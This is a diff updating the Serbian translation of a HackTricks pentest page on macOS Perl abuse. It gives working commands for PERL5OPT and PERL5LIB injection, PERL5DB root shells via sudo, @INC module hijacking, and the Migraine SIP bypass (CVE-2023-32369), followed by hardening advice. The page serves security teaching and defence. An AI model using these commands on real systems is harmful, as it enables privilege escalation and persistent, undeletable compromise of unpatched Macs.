@@ -2,47 +2,47 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Putem `PERL5OPT` & `PERL5LIB` env varijable
+## Putem `PERL5OPT` i `PERL5LIB` env variable
 
-Korišćenjem env varijable **`PERL5OPT`** moguće je naterati **Perl** da izvrši proizvoljne komande kada se interpreter pokrene (čak **pre** nego što se prva linija ciljnog skripta obradi).
-Na primer, kreirajte ovaj skript:
+Korišćenjem env variable **`PERL5OPT`** moguće je naterati **Perl** da izvrši proizvoljne komande kada se interpreter pokrene (čak **pre** nego što se parsira prva linija ciljne skripte).
+Na primer, kreirajte ovu skriptu:
 ```perl:test.pl
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-Sada **izvezite env promenljivu** i izvršite **perl** skriptu:
+Sada **eksportujte env promenljivu** i izvršite **perl** skriptu:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-Druga opcija je da se kreira Perl modul (npr. `/tmp/pmod.pm`):
+Druga opcija je da kreirate Perl modul (npr. `/tmp/pmod.pm`):
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-I zatim koristite env varijable tako da se modul automatski locira i učita:
+A zatim koristite env promenljive kako bi modul bio pronađen i automatski učitan:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
 ```
-### Ostale zanimljive promenljive okruženja
+### Druge zanimljive environment variables
 
-* **`PERL5DB`** – kada se interpreter pokrene sa **`-d`** (debugger) flagom, sadržaj `PERL5DB` se izvršava kao Perl kod *unutar* konteksta debagera. 
-Ako možete da utičete na oba, okruženje **i** komandne linijske flagove privilegovanog Perl procesa, možete uraditi nešto poput:
+* **`PERL5DB`** – kada se interpreter pokrene sa zastavicom **`-d`** (debugger), sadržaj promenljive `PERL5DB` izvršava se kao Perl code *unutar* debugger context-a.
+Ako možete da utičete i na environment **i** na command-line flags privilegovanog Perl procesa, možete uraditi nešto poput:
 
 ```bash
 export PERL5DB='system("/bin/zsh")'
-sudo perl -d /usr/bin/some_admin_script.pl   # će otvoriti shell pre izvršavanja skripte
+sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
 ```
 
-* **`PERL5SHELL`** – na Windows-u ova promenljiva kontroliše koji izvršni fajl shell-a Perl će koristiti kada treba da pokrene shell. Pominje se ovde samo radi potpunosti, jer nije relevantna na macOS-u.
+* **`PERL5SHELL`** – na Windows-u ova promenljiva određuje koji shell executable će Perl koristiti kada treba da pokrene shell. Ovde se pominje samo radi potpunosti, jer nije relevantna za macOS.
 
-Iako `PERL5DB` zahteva `-d` switch, uobičajeno je naći skripte za održavanje ili instalaciju koje se izvršavaju kao *root* sa ovim flagom uključenim za detaljno rešavanje problema, čineći promenljivu validnim vektorom eskalacije.
+Iako `PERL5DB` zahteva switch `-d`, često se mogu pronaći maintenance ili installer scripts koji se izvršavaju kao *root* sa ovom zastavicom omogućenom radi detaljnog troubleshooting-a, zbog čega je ova promenljiva validan escalation vector.
 
-## Putem zavisnosti (@INC zloupotreba)
+## Preko dependencies (@INC abuse)
 
-Moguće je nabrojati putanju uključivanja koju Perl će pretraživati (**`@INC`**) pokretanjem:
+Moguće je izlistati include path koji će Perl pretraživati (**`@INC`**) pokretanjem:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
@@ -58,23 +58,23 @@ Tipičan izlaz na macOS 13/14 izgleda ovako:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Neki od vraćenih foldera čak ni ne postoje, međutim **`/Library/Perl/5.30`** postoji, *nije* zaštićen SIP-om i *pre* je zaštićenih foldera SIP-om. Stoga, ako možete pisati kao *root*, možete postaviti zloćudni modul (npr. `File/Basename.pm`) koji će biti *preferencijalno* učitan od strane bilo kog privilegovanog skripta koji uvozi taj modul.
+Neki od vraćenih foldera čak i ne postoje, međutim **`/Library/Perl/5.30`** postoji, *nije* zaštićen pomoću SIP-a i nalazi se *pre* foldera zaštićenih SIP-om. Zato, ako možete da pišete kao *root*, možete ubaciti maliciozni modul (npr. `File/Basename.pm`) koji će biti *prioritetno* učitan od strane bilo koje privilegovane skripte koja importuje taj modul.
 
 > [!WARNING]
-> I dalje vam je potreban **root** da biste pisali unutar `/Library/Perl`, a macOS će prikazati **TCC** prompt koji traži *Potpunu pristup disku* za proces koji vrši operaciju pisanja.
+> I dalje vam je potreban **root** za upis unutar direktorijuma `/Library/Perl`, a macOS će prikazati **TCC** prompt koji od procesa koji izvršava operaciju upisa zahteva *Full Disk Access*.
 
-Na primer, ako skripta uvozi **`use File::Basename;`**, bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` koji sadrži kod pod kontrolom napadača.
+Na primer, ako skripta importuje **`use File::Basename;`**, bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` koji sadrži kod pod kontrolom napadača.
 
-## SIP zaobilaženje putem Migration Assistant (CVE-2023-32369 “Migraine”)
+## SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)
 
-U maju 2023. Microsoft je objavio **CVE-2023-32369**, nazvan **Migraine**, tehnika post-exploatacije koja omogućava *root* napadaču da potpuno **zaobiđe zaštitu integriteta sistema (SIP)**. 
-Ranljiva komponenta je **`systemmigrationd`**, demon sa ovlašćenjem **`com.apple.rootless.install.heritable`**. Svaki podproces koji pokrene ovaj demon nasleđuje ovlašćenje i stoga se izvršava **van** SIP ograničenja.
+U maju 2023. Microsoft je objavio **CVE-2023-32369**, nadimka **Migraine**, post-exploitation tehniku koja *root* napadaču omogućava da u potpunosti **zaobiđe System Integrity Protection (SIP)**.
+Ranljiva komponenta je **`systemmigrationd`**, daemon sa entitlementom **`com.apple.rootless.install.heritable`**. Svaki child process koji ovaj daemon pokrene nasleđuje entitlement i zato se izvršava **izvan** SIP ograničenja.<sup>[1]</sup>
 
-Među decom koje su identifikovali istraživači je Apple-ov potpisani interpreter:
+Među child process-ima koje su istraživači identifikovali nalazi se i Apple-signed interpreter:<sup>[1]</sup>
 ```
 /usr/bin/perl /usr/libexec/migrateLocalKDC …
 ```
-Zato što Perl poštuje `PERL5OPT` (a Bash poštuje `BASH_ENV`), zagađenje *okruženja* daemona je dovoljno da se dobije proizvoljna izvršna prava u kontekstu bez SIP-a:
+Pošto Perl poštuje `PERL5OPT` (a Bash poštuje `BASH_ENV`), trovanje *okruženja* daemon-a dovoljno je za sticanje proizvoljnog izvršavanja u SIP-less kontekstu:<sup>[1][2]</sup>
 ```bash
 # As root
 launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'
@@ -82,20 +82,20 @@ launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'
 # Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
 open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
 ```
-Kada `migrateLocalKDC` pokrene, `/usr/bin/perl` se pokreće sa malicioznim `PERL5OPT` i izvršava `/private/tmp/migraine.sh` *pre nego što se SIP ponovo omogući*. Iz tog skripta možete, na primer, kopirati payload unutar **`/System/Library/LaunchDaemons`** ili dodeliti `com.apple.rootless` proširenu atribut da biste učinili datoteku **neizbrisivom**.
+Kada se pokrene `migrateLocalKDC`, `/usr/bin/perl` se pokreće sa zlonamernim `PERL5OPT` i izvršava `/private/tmp/migraine.sh` *pre ponovnog omogućavanja SIP-a*. Iz te skripte možete, na primer, kopirati payload u **`/System/Library/LaunchDaemons`** ili dodeliti datoteci prošireni atribut `com.apple.rootless`, čime se ona čini **nemogućom za brisanje**.
 
-Apple je ispravio problem u macOS **Ventura 13.4**, **Monterey 12.6.6** i **Big Sur 11.7.7**, ali stariji ili neispravljeni sistemi ostaju podložni eksploataciji.
+Apple je otklonio problem u macOS **Ventura 13.4**, **Monterey 12.6.6** i **Big Sur 11.7.7**, ali stariji ili nezakrpljeni sistemi i dalje mogu biti iskorišćeni.<sup>[1]</sup>
 
-## Preporuke za učvršćivanje
+## Preporuke za hardening
 
-1. **Obrišite opasne promenljive** – privilegovani launchdaemons ili cron poslovi treba da se pokreću u čistom okruženju (`launchctl unsetenv PERL5OPT`, `env -i`, itd.).
-2. **Izbegavajte pokretanje interpretera kao root** osim ako nije strogo neophodno. Koristite kompajlirane binarne datoteke ili rano smanjite privilegije.
-3. **Vendor skripte sa `-T` (taint mode)** tako da Perl ignoriše `PERL5OPT` i druge nesigurne opcije kada je provera taint-a omogućena.
-4. **Držite macOS ažuriranim** – “Migrena” je potpuno ispravljena u trenutnim izdanjima.
+1. **Obrišite opasne promenljive** – privilegovani launchdaemons ili cron poslovi treba da se pokreću sa čistim okruženjem (`launchctl unsetenv PERL5OPT`, `env -i`, itd.).
+2. **Izbegavajte pokretanje interpreter-a kao root** osim kada je to striktno neophodno. Koristite kompajlirane binarne datoteke ili rano smanjite privilegije.
+3. **Isporučujte skripte sa `-T` (taint mode)** kako bi Perl ignorisao `PERL5OPT` i druge nebezbedne switches kada je provera taint-a omogućena.
+4. **Redovno ažurirajte macOS** – “Migraine” je u potpunosti zakrpljen u aktuelnim izdanjima.
 
 ## Reference
 
-- Microsoft Security Blog – “Nova macOS ranjivost, Migrena, može zaobići zaštitu integriteta sistema” (CVE-2023-32369), 30. maj 2023.
-- Hackyboiz – “macOS SIP Bypass (PERL5OPT & BASH_ENV) istraživanje”, maj 2025.
+- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)
 
 {{#include ../../../banners/hacktricks-training.md}}
